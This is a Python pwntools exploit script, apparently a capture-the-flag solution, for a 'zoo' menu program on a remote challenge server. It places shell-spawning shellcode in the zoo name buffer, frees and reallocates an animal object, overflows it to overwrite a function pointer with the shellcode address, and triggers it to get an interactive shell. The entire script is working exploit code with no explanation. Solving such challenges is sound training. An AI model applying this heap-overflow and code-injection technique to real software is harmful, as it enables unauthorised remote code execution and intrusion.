from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28245)
elf = ELF('./pwn')
def add_dog(name,weight):
        io.sendlineafter('Your choice :','1')
        io.sendlineafter('Name : ',name)
        io.sendlineafter('Weight : ',str(weight))
def add_cat(name,weight):
        io.sendlineafter('Your choice :','2')
        io.sendlineafter('Name : ',name)
        io.sendlineafter('Weight : ',str(weight))
def listen(index):
        io.sendlineafter('Your choice :','3')
        io.sendlineafter('index of animal : ',str(index))
def show(index):
        io.sendlineafter('Your choice :','4')
        io.sendlineafter('index of animal : ',str(index))
def remove(index):
        io.sendlineafter('Your choice :','5')
        io.sendlineafter('index of animal : ',str(index))
name = 0x605380
io.recvuntil('Name of Your zoo :')
shellcode = asm(shellcraft.sh())
io.sendline(shellcode+p64(name))
add_dog('aaaa',0)
add_dog('bbbb',1)
remove(0)
add_dog('a'*0x48+p64(name+len(shellcode)),2)
listen(0)
io.interactive()
